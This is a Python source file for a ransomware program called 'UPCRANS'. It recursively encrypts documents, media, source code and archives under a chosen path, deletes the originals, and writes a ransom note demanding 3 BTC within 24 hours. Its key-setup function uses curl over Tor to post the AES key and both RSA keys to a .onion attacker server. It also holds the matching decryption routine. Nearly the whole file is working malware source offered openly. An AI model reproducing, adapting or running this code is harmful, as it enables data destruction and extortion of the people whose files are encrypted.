#    @@@  @@@  @@@@@@@    @@@@@@@  @@@@@@@    @@@@@@   @@@  @@@   @@@@@@    #  
#    @@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@    #    
#    @@!  @@@  @@!  @@@  !@@       @@!  @@@  @@!  @@@  @@!@!@@@  !@@        #       
#    !@!  @!@  !@!  @!@  !@!       !@!  @!@  !@!  @!@  !@!!@!@!  !@!        #     
#    @!@  !@!  @!@@!@!   !@!       @!@!!@!   @!@!@!@!  @!@ !!@!  !!@@!!     #    
#    !@!  !!!  !!@!!!    !!!       !!@!@!    !!!@!!!!  !@!  !!!   !!@!!!    #   
#    !!:  !!!  !!:       :!!       !!: :!!   !!:  !!!  !!:  !!!       !:!   #   
#    :!:  !:!  :!:       :!:       :!:  !:!  :!:  !:!  :!:  !:!      !:!    #   
#    ::::: ::   ::        ::: :::  ::   :::  ::   :::   ::   ::  :::: ::    #   
#    : :  :    :         :: :: :   :   : :   :   : :  ::    :   :: : :      # 

from Crypto import Random
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
import os, sys, struct
import argparse
from Database.keygenerator import class_keys

URL_TOR = "lxu7zbrvwbo7ogy7u7yzy65yld2rdgjfcwgoyrkejedqoefboeejspid.onion"
PWD_RANS = os.path.dirname(os.path.abspath(__file__))

if sys.version_info >= (3, 8, 0):
        import time
        time.clock = time.process_time


def parse_args():
    parser = argparse.ArgumentParser(description='Ransomware-UPCRANS')

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--encrypt', help='Encrypt files', action='store_true')
    group.add_argument('--decrypt', help='Decrypt files', action='store_true')

    parser.add_argument('--path', help='Path to start attack', action="store", required = '--encrypt' in sys.argv) 
    parser.add_argument('--AESkey', help='Path of the key', action="store", required='--decrypt' in sys.argv) 
    parser.add_argument('--RSAkey', help='Path of the key', action="store", required='--decrypt' in sys.argv)
    
    return parser.parse_args()


def create_Readme():
    text = '''                                                              
    @@@  @@@  @@@@@@@    @@@@@@@  @@@@@@@    @@@@@@   @@@  @@@   @@@@@@   
    @@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@   
    @@!  @@@  @@!  @@@  !@@       @@!  @@@  @@!  @@@  @@!@!@@@  !@@       
    !@!  @!@  !@!  @!@  !@!       !@!  @!@  !@!  @!@  !@!!@!@!  !@!       
    @!@  !@!  @!@@!@!   !@!       @!@!!@!   @!@!@!@!  @!@ !!@!  !!@@!!    
    !@!  !!!  !!@!!!    !!!       !!@!@!    !!!@!!!!  !@!  !!!   !!@!!!   
    !!:  !!!  !!:       :!!       !!: :!!   !!:  !!!  !!:  !!!       !:!  
    :!:  !:!  :!:       :!:       :!:  !:!  :!:  !:!  :!:  !:!      !:!   
    ::::: ::   ::        ::: :::  ::   :::  ::   :::   ::   ::  :::: ::   
    : :  :    :         :: :: :   :   : :   :   : :  ::    :   :: : :    
                                                                        
    Sadly your computer has been infected and all your files have been encrypted.
    If you want to recover all your data, you have 24 hours to pay 3 BTC in the following wallet:
    aweuioxjvsjdñroj3084u

    When you pay and receive the private key, you have to save it in a file and execute the following command:
    python upcrans.py --decrypt --AESkey KEY.txt --RSAkey KEYRSA.txt


    In addition, you can talk with us in this chat: xxxxxxxxxx.onion

    With our deepest regret,
    ~UPCRANS team~  
    '''

    with open('README.txt', 'w') as fo:
                fo.write(text)
    return 


#Initialize both AES and RSA keys and store in class_keys
def initialize_keys():
    #Initialize keys
    keys = class_keys()
    data = (keys.AESkey, keys.PUBLIC_RSAKEY, keys.PRIVATE_RSAKEY, '0')
    
    #Send keys to the attacker server
    command =  '''curl --socks5-hostname localhost:9050 '''+URL_TOR+''' -H "Content-Type: application/json"   -X POST --data '{"keyAES":"'''+keys.AESkey.hex()+'''", "keyPubRSA":"'''+keys.PUBLIC_RSAKEY.hex()+'''", "keyPrivRSA":"'''+keys.PRIVATE_RSAKEY.hex()+'''"}' '''
    os.system(command)

    #Store AES key encrypted in system
    with open('KEY.txt', 'wb') as fo:
                key_encrypted = encrypt_key(keys.AESkey, keys.PUBLIC_RSAKEY)
                fo.write(key_encrypted)
    return keys


# Encrypt KEY (AES) with public key (RSA).
def encrypt_key(AESkey, key):
    public_key = RSA.importKey(key)
    encryptor = PKCS1_OAEP.new(public_key)
    encrypted_key = encryptor.encrypt(AESkey)
    return encrypted_key


#Import key from the "path"
def importKey(path):
    with open(path, 'rb') as fo:
            res = fo.read()
    return res


# Decrypt KEY (AES) with private key (RSA).
def decrypt_key(AESpath, RSApath):
    #Import keys from files
    AESkeyEnc = importKey(AESpath)
    RSAkey = importKey(RSApath)

    #Decrypt key 
    private_key = RSA.importKey(RSAkey)
    decryptor = PKCS1_OAEP.new(private_key)
    AESkey = decryptor.decrypt(AESkeyEnc)
    return AESkey


# List files of a system
def list_files(args):
    path = args.path
    if args.encrypt == True:
        extensions = [
            'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
            'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
            'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies

            'doc', 'docx', 'xls', 'xlsx', '.ppt','.pptx', # Microsoft office
            'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', 'txt', # OpenOffice, Adobe, Latex, Markdown, etc
            'yml', 'yaml', 'json', 'xml', 'csv', # structured data
            'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images
            
            'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
            'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
            'java', 'class', 'jar', # java source code
            'ps', 'bat', 'vb', 'vbs' # windows based scripts
            'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
            'go', 'py', 'pyc', 'bf', 'coffee', # other source code files

            'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak'  # compressed formats        
        ]

        files = []
        for r, d, f in os.walk(path):
            if PWD_RANS in r:
                continue
            else:
                for file in f:
                    if file.split('.')[-1] in extensions:
                        files.append(os.path.join(r, file))
    else:  
        extensions = ['upcrans']

        files = []
        for r, d, f in os.walk(path):
            for file in f:
                if file.split('.')[-1] in extensions:
                    files.append(os.path.join(r, file)) 
    return files


# Encrypt function
def encrypt(filename, infile, outfile, key):
    block_size = AES.block_size #AES block_size = 16 
    chunk_size = block_size*1024 

    filesize = os.path.getsize(filename)
    outfile.write(struct.pack('<Q', filesize))

    iv = Random.new().read(block_size)
    outfile.write(iv)

    encr = AES.new(key, AES.MODE_CBC, iv)

    end_file = False

    while not end_file:
        chunk = infile.read(chunk_size)
        if len(chunk) == 0:
            break        
        elif len(chunk) % block_size != 0:
            end_file = True
            padding_length = (block_size - len(chunk) % block_size) or block_size
            chunk += (padding_length * chr(padding_length)).encode()

        outfile.write(encr.encrypt(chunk))
    
    
# Encrypt file
def encrypt_file(l_files, key):
    for filename in l_files:
        with open(filename, 'rb') as fi:
            with open(filename + ".upcrans", 'wb') as fo:
                encrypt(filename, fi, fo, key)
        print ("File encrypted\n" ,filename,"===>" ,filename+".upcrans")
        os.remove(filename)


# Decrypt function
def decrypt(infile, outfile, key):
    block_size = AES.block_size #AES block_size = 16 
    chunk_size = block_size*1024 

    size_orig = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]   
    iv = infile.read(16)

    decr = AES.new(key, AES.MODE_CBC, iv)

    end_file = False

    while not end_file:
        chunk = infile.read(chunk_size)
        if len(chunk) == 0:
            break        
        elif len(chunk) % block_size != 0:
            end_file = True
            padding_length = (block_size - len(chunk) % block_size) or block_size
            chunk += (padding_length * chr(padding_length)).encode()

        outfile.write(decr.decrypt(chunk))
    outfile.truncate(size_orig)


# Decrypt file
def decrypt_file(l_files, key):
    for file_name in l_files:
        print(file_name)
        with open(file_name, 'rb') as fi:
            filename, filextensions = os.path.splitext(file_name)
            with open(filename, 'wb') as fo:
                decrypt(fi, fo, key)
        print ("File decrypted\n" ,filename)
        os.remove(file_name)

        
def main(): 
    args = parse_args()
    l_files = list_files(args)

    if args.encrypt == True:
        #Encrypt files of your system
        keys = initialize_keys()
        encrypt_file(l_files, keys.AESkey)
        create_Readme()

    elif args.decrypt == True:
        #Decrypt the encrypted files of your system
        AESkey = decrypt_key(args.AESkey, args.RSAkey)
        decrypt_file(l_files, AESkey)


if __name__ == "__main__":
    main()
